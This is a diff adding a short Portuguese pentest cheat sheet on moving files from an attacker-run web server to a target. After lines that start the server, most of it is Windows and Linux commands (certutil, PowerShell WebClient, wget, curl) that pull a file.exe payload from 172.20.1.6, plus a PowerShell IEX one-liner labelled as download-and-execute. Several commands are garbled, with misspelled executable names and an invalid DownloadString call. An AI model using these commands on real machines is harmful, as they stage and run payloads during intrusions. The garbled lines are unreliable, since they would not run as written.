@@ -1,0 +1,13 @@
+TRANSFERÊNCIA DE AQUIVOS: WEB
+Subindo o servidor:
+service apache2 start
+python -m SimpleHTTPServer 80
+python3 -m http.server 80
+Se conectando à ele (WINDOWS):
+1 - certutil.exe -urlcache -f http://172.20.1.6/file.exe file.exe Faz Donwload do arquivo
+2 - poweshell.exe wget http://172.20.1.6/file -OutFile file.exe Faz Donwload do arquivo
+3 - powershel.exe (New-Object  System.Net.WebClient).DownloadFile('http://172.20.1.6/file.exe','file.exe') Faz Donwload
+4 - powershel.exe IEX(New-Object System.Net.WebClient).DownloadString('http://172.20.1.6/file.exe','file.exe') Faz down e executa
+Se conectando à ele (LINUX):
+wget http://172.20.1.6/file.exe -O /tmp/file.exe
+curl http://172.20.1.6/file.exe -o file.exe
